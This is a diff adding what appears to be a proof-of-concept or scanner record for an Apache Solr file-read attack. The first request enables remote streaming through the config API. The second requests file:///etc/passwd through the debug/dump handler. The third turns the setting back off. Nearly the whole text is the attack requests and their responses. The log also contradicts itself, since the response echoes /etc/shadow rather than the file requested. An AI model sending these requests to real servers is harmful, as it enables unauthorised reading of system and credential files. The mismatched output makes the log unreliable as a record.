@@ -1,0 +1,53 @@
+- Request 1:
+
+POST /solr/test/config HTTP/1.1
+
+{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+
+- Response 1:
+
+HTTP/1.1 200 Ok
+Content-Length: 0
+
+- Request 2:
+
+GET /solr/test/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd HTTP/1.1
+
+- Response 2:
+
+HTTP/1.1 200 Ok
+Content-Length: 513
+
+{
+  "responseHeader": {
+    "status": 500,
+    "QTime": 37,
+    "handler": "org.apache.solr.handler.DumpRequestHandler",
+    "params": {
+      "param": "ContentStreams",
+      "stream.url": "file:///etc/shadow"
+    }
+  },
+  "params": {
+    "stream.url": "file:///etc/shadow",
+    "echoHandler": "true",
+    "param": "ContentStreams",
+    "echoParams": "explicit"
+  },
+  "error": {
+    "msg": "/etc/shadow (Permission denied)",
+    "trace": "...Exception: /etc/shadow (Permission denied)...",
+    "code": 500
+  }
+}
+
+- Request 3:
+
+POST /solr/test/config HTTP/1.1
+
+{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":false}}
+
+- Response 3:
+
+HTTP/1.1 200 Ok
+Content-Length: 0
